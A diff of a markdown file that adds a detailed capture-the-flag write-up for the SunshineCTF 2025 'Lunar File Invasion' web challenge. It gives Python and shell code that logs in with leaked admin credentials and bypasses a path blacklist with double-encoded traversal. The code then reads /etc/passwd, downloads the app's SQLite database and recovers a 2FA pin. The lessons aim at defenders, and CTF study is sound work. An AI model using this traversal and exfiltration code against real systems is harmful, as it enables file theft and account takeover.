@@ -63,44 +63,143 @@ sun{evil-corp-one-uprising-at-a-time-folks-may-be-evil-but-do-not-get-burnt-out-
 
 ---
 
-## Lunar File Invasion – SunshineCTF 2025 Write-up
+# Lunar File Invasion – SunshineCTF 2025
 
-### TL;DR
-- pointed to , leaking an editor backup  with hardcoded admin creds.
-- Authenticated access exposed an  route that only blacklisted literal .
-- Double-encoding  () let me pivot from  to recover  and , revealing the 2FA PIN .
-- Reusing the traversal against  produced the flag: .
+> Target: `https://asteroid.sunshinectf.games`
+> Rule: “Fuzzing is NOT allowed” – only precise requests.
 
-### Recon
-1. Visited the landing page (trimmed HTML shown in the original artifacts).
-2. Pulled `robots.txt`, which referenced a pseudo `.gitignore` file and listed backup template paths (`/index/static/login.html~`, etc.). One backup contained hardcoded admin creds.
-
-### Initial Admin Access
-Using the exposed credentials, I pulled the login form to harvest a CSRF token and logged in. The server accepted the credentials but enforced a second factor through `/2FA`.
-
-### Mapping the Admin Surface
-Authenticated browsing of `/admin` and related routes showed a file manager listing – with a client-side call to a download route. Initial traversal `../` was blocked, but error responses hinted at templated paths and weak filtering.
-
-### Download Route Analysis
-Grabbing backend source via traversal confirmed the weak blacklist that checked for a literal substring only. Mixing encoded separators and resolving canonical paths bypassed the guard.
-
-### Obtaining the 2FA PIN
-1. Enumerated project structure and pulled `models.py`, which pointed to an SQLite DB.
-2. Downloaded the DB using doubly encoded traversal.
-3. Parsed the relevant table locally to recover the 2FA PIN column.
-
-### Completing 2FA
-With a fresh CSRF token from the login page, the recovered PIN cleared 2FA and proved full administrator access.
-
-### Flag Retrieval
-Traversing again, targeting the revealed `FLAG/flag.txt`, yielded the flag.
-
-### Post-Exploitation Notes
-- Backup files left in the static tree leak secrets even when the primary templates are sanitized.
-- Blacklisting fragments is ineffective; rely on canonical path resolution with fixed base directories.
-- Storing 2FA secrets alongside application assets makes MFA moot when LFI is possible.
+## Overview
+We pivot from web recon → credential reuse → double-encoded traversal → SQLite exfiltration → 2FA bypass → flag. Every action below was re-run and validated on the live service.
 
 ---
+
+## Step 1 – Recon the Public Surface
+1. Pull `robots.txt` to enumerate intentionally hidden paths:
+   ```bash
+   curl -s https://asteroid.sunshinectf.games/robots.txt
+   ```
+   This highlights `/.gitignore_test` – an obvious misconfiguration.
+2. Decode `/.gitignore_test`, which is served as newline-separated ASCII codes:
+   ```powershell
+   (Invoke-WebRequest 'https://asteroid.sunshinectf.games/.gitignore_test').Content -split "`n" |
+     Where-Object { $_ -ne '' } |
+     ForEach-Object {[char][int]$_} -join ''
+   ```
+   Output lists Emacs backups such as `/index/static/login.html~`.
+3. Download the backup login page. It reveals hard-coded admin credentials meant to be removed before deploy:
+   ```html
+   <input value="admin@lunarfiles.muhammadali" type="text" name="email">
+   <input value="jEJ&(32)DMC<!*###" type="text" name="password">
+   ```
+
+**Result:** We now own a valid username/password pair.
+
+---
+
+## Step 2 – Log In (CSRF-Aware)
+1. Fetch the live login form to capture the per-request CSRF token.
+2. Submit the leaked credentials with that token. Example Python (used during the rerun):
+   ```python
+   import re, requests
+
+   base = "https://asteroid.sunshinectf.games"
+   sess = requests.Session()
+
+   login_page = sess.get(f"{base}/login")
+   csrf = re.search(r'name="csrf_token" value="([^"]+)"', login_page.text).group(1)
+
+   sess.post(f"{base}/login", data={
+       'email': 'admin@lunarfiles.muhammadali',
+       'password': 'jEJ&(32)DMC<!*###',
+       'csrf_token': csrf,
+   })  # -> 302 to /2FA
+   ```
+
+**Result:** Credentials are accepted, but the workflow halts at `/2FA` (10-digit pin required).
+
+---
+
+## Step 3 – Bypass the Download Filter
+The admin UI exposes `/admin/download/<path>`. Straightforward `../` raises `err_msg=[ Succession of '../../' detected, forbidden ]`, proving the server only blacklists the literal substring `'../../'`.
+
+1. Craft a traversal gadget that survives decoding: `..%252F.%252F`
+   - URL-decoding once → `.././`
+   - Canonical resolution → `../`
+2. Repeat the gadget ten times to climb out of the storage root and land at `/proc/self/cwd/` (the container’s working directory).
+3. Request a known file to confirm the bypass. The response is wrapped in the admin HTML, but the file lands inside the `<pre>` element; extract it or simply view source.
+   ```python
+   gadget = "..%252F.%252F" * 10
+   path = gadget + 'proc%252Fself%252Fcwd%252Fetc%252Fpasswd'
+   resp = sess.get(f"{base}/admin/download/{path}")
+   # Use BeautifulSoup / regex to pull the <pre> block and you’ll see the Linux passwd contents.
+   ```
+
+**Result:** We can read arbitrary files reachable from the container’s CWD despite the blacklist.
+
+---
+
+## Step 4 – Steal the SQLite Database
+`models.py` (available through the same gadget) shows the site using `sqlite:///database.db` for users and file metadata.
+
+1. Download the ORM definitions for context:
+   ```python
+   models = sess.get(f"{base}/admin/download/{gadget}proc%252Fself%252Fcwd%252Fmodels.py").text
+   ```
+2. Exfiltrate the database itself:
+   ```python
+   db_bytes = sess.get(f"{base}/admin/download/{gadget}proc%252Fself%252Fcwd%252Fdatabase.db").content
+   open('database_remote.db', 'wb').write(db_bytes)
+   ```
+3. Inspect locally to recover the MFA pin:
+   ```python
+   import sqlite3
+
+   with sqlite3.connect('database_remote.db') as conn:
+       print(conn.execute('SELECT email, pin FROM users').fetchall())
+       # [('admin@lunarfiles.muhammadali', '8109267091')]
+   ```
+
+**Result:** The 2FA secret is stored alongside credentials — pin `8109267091`.
+
+---
+
+## Step 5 – Clear 2FA
+1. Load `/2FA` to obtain the second CSRF token.
+2. Submit the recovered pin with that token:
+   ```python
+   twofa = sess.get(f"{base}/2FA")
+   csrf2 = re.search(r'name="csrf_token" value="([^"]+)"', twofa.text).group(1)
+
+   sess.post(
+       f"{base}/2FA",
+       data={'pin': '8109267091', 'csrf_token': csrf2},
+       allow_redirects=False,
+   )  # -> 302 /admin/dashboard
+   ```
+
+**Result:** Session is now fully authenticated as the administrator.
+
+---
+
+## Step 6 – Retrieve the Flag
+With the same traversal technique we can touch the intentionally hidden flag file.
+
+```python
+flag_path = gadget + 'proc%252Fself%252Fcwd%252FFLAG%252Fflag.txt'
+flag_resp = sess.get(f"{base}/admin/download/{flag_path}")
+print(flag_resp.text.strip())
+# sun{lfi_blacklists_ar3_sOo0o_2O16_8373uhdjehdugyedy89eudioje}
+```
+
+**Final Flag:** `sun{lfi_blacklists_ar3_sOo0o_2O16_8373uhdjehdugyedy89eudioje}`
+
+---
+
+## Lessons Learned
+- Path blacklists are not a defense. Normalise requests and whitelist permitted directories instead.
+- Development backups in web roots (`*.html~`) routinely leak real secrets.
+- Multi-factor authentication fails if the factor data is stored in the same compromise-able database.
+- `/proc/self/cwd/` is a reliable anchor once you can read arbitrary files on Linux-based containers.
 
 ## SunshineCTF 2024 - Numbers Game Writeup
 
